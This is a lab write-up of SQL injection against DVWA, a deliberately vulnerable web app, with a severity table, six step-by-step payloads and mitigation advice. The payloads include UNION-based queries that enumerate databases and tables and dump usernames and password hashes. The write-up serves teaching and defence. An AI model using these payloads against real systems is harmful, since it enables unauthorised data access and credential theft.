# SQL Injection Write-Up

## Overview

| Field | Details |
|-------|---------|
| Vulnerability | SQL Injection |
| Severity | Critical |
| CVSS Score | 9.8 |
| Target | DVWA on AWS EC2 |
| Security Level | Low |

## What Is SQL Injection?

SQL Injection occurs when user input is inserted directly into a database query without sanitization. An attacker can manipulate the query to extract, modify, or delete data.

## Steps to Reproduce

### Step 1: Confirm Normal Behavior
Input: 1
Result: Returns user data for ID 1. Confirms the field queries the database normally.

### Step 2: Test for Injection
Payload:
1' OR '1'='1
Result: Returns ALL users. The single quote breaks the query logic.

### Step 3: Extract DB Version
Payload:
1' UNION SELECT null, version()#
Result: Returns MySQL version string.

### Step 4: Enumerate Databases
Payload:
1' UNION SELECT null, schema_name FROM information_schema.schemata#
Result: Lists all databases on the server.

### Step 5: Enumerate Tables
Payload:
1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema='dvwa'#
Result: Returns table names including users and guestbook.

### Step 6: Dump Credentials
Payload:
1' UNION SELECT user, password FROM users#
Result: Returns all usernames and MD5 hashed passwords for 5 accounts.

## Real-World Defense Observed
ModSecurity WAF blocked all payloads with 403 Forbidden until disabled, demonstrating WAF protection as an effective mitigation layer.

## Impact
- Full database enumeration
- Exposure of all user credentials
- Authentication bypass potential

## Mitigations
- Use prepared statements and parameterized queries
- Validate and whitelist input types
- Apply least privilege to database accounts
- Deploy a Web Application Firewall
- Never expose raw SQL errors to users
- Store passwords with bcrypt or Argon2 not MD5

## References
- https://owasp.org/www-community/attacks/SQL_Injection
- https://cwe.mitre.org/data/definitions/89.html
